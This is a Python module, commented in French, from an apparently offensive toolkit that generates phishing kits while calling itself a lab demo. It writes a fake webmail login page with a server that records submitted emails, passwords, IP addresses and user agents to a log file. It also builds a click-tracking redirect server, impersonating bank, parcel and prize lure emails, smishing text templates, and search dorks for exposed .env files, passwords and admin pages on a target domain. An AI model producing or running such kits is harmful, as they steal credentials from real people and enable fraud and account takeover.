# modules/phish.py - 5 outils phishing (demo lab autorise, capture locale)
import os, json, time, threading, http.server, urllib.parse

OUT = os.path.expanduser("~/Desktop/FlashToolSuper/sorties/phishing")
os.makedirs(OUT, exist_ok=True)

def ask(label): return input(f"  {label} : ").strip()

def save(name, content):
    p = os.path.join(OUT, name)
    open(p, "w").write(content)
    print(f"  [OK] {p}")
    return p

LOGIN_TMPL = """<!doctype html><html><head><meta charset=utf8><title>{title}</title>
<style>body{{background:#0a0a1a;color:#eee;font-family:sans-serif;display:grid;place-items:center;height:100vh}}
form{{background:#151528;padding:40px;border-radius:12px;width:320px}}
input{{width:100%;padding:12px;margin:8px 0;border:0;border-radius:6px}}
button{{width:104%;padding:12px;background:#ffd60a;color:#111;font-weight:bold;border:0;border-radius:6px;cursor:pointer}}
</style></head><body>
<form method="POST" action="/go">
  <h2>{title}</h2>
  <input name="u" placeholder="email" required>
  <input name="p" type="password" placeholder="mot de passe" required>
  <button>Se connecter</button>
</form></body></html>"""

def login_page():
    """page de capture demo - les identifiants postes arrivent dans captures.log"""
    title = ask("titre de la page") or "Webmail - Connexion"
    save("login_demo.html", LOGIN_TMPL.format(title=title))
    code = """
import http.server, urllib.parse, datetime
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("login_demo.html","rb").read())
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        data = urllib.parse.parse_qs(self.rfile.read(n).decode())
        line = f"{datetime.datetime.now()} IP={self.client_address[0]} UA={self.headers.get('User-Agent','')} id={data.get('u')} pw={data.get('p')}"
        open("captures.log","a").write(line + "\\n"); print(line)
        self.send_response(302); self.send_header("Location","https://example.com"); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8081), H).serve_forever()
"""
    save("serve_login.py", code)
    print("  lance: python3 sorties/phishing/serve_login.py  -> page sur :8081, captures dans captures.log")

def link_tracker():
    """serveur de tracking : logge IP/UA/heure puis redirige"""
    dest = ask("URL de redirection") or "https://example.com"
    code = f"""
import http.server, datetime
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        line = f"{{datetime.datetime.now()}} CLIC IP={{self.client_address[0]}} UA={{self.headers.get('User-Agent','')}} ref={{self.headers.get('Referer','-')}}"
        open("clics.log","a").write(line + "\\n"); print(line)
        self.send_response(302); self.send_header("Location","{dest}"); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8082), H).serve_forever()
"""
    save("tracker.py", code)
    print("  lance: python3 sorties/phishing/tracker.py -> tout clic sur :8082 est logge dans clics.log")

def pretext_email():
    domain = ask("domaine cible (ex banque.com)") or "banque.com"
    sender = ask("emetteur affiche") or f"no-reply@alertes-{domain}"
    tpl = f"""OBJET : ALERTE SECURITE - verification requise
DE    : {sender}

Bonjour,

Une connexion suspecte a ete detectee sur votre espace.
Si ce n'etait pas vous, verifiez immediatement vos identifiants :

  -> https://verification.{domain}/connexion

Ce lien expire dans 24 heures.
Service Securite - {domain}
"""
    save("pretexte_securite.txt", tpl)
    save("pretexte_colis.txt", """OBJET : Votre colis est retenu - droits de douane

Votre colis n° CD-48291 est retenu au centre de distribution.
Reglez les frais de dossier (1,99) pour le deballer :

  -> https://suivi-colis-express.example/pay

Colis detruit apres 72 h sans action.
""")
    save("pretexte_prize.txt", """OBJET : Felicitations ! Vous avez gagne

Votre adresse a ete tiree au sort parmi les inscrits.
Reclamez votre lot avant dimanche minuit :

  -> https://loterie-exemple.example/claim
""")
    print("  3 modeles generes - usage : lab / test de sensibilite autorise")

def pretext_sms():
    save("pretextes_sms.txt", """[SMISHING 1] FR-ALERT: Colis retenu. Reglez 1,99: https://bit.ly/xxxxx (72h)
[SMISHING 2] Votre compte sera bloque. Confirmez vos identifiants: https://verification.exemple.com
[SMISHING 3] Code de securite envoye par erreur. Annulez sur: https://annulation.exemple.com
[SMISHING 4] Prime de fin d'annee disponible. Reclamez avant 23h59: https://prime.exemple.com
""")
    print("  modeles generes - tester sur vos propres numeros uniquement")

def dork_gen():
    d = ask("domaine")
    save("dorks.txt", "\n".join([
        f"site:{d} inurl:login", f"site:{d} filetype:pdf", f"site:{d} filetype:xls",
        f"site:{d} intitle:\"index of\"", f"site:{d} inurl:admin", f"site:{d} inurl:.env",
        f"site:{d} intext:password", f"site:{d} intext:confidentiel",
        f"\"@{d}\" site:linkedin.com", f"site:{d} inurl:wp-content",
    ]))
    print("  10 dorks ecrits dans dorks.txt")
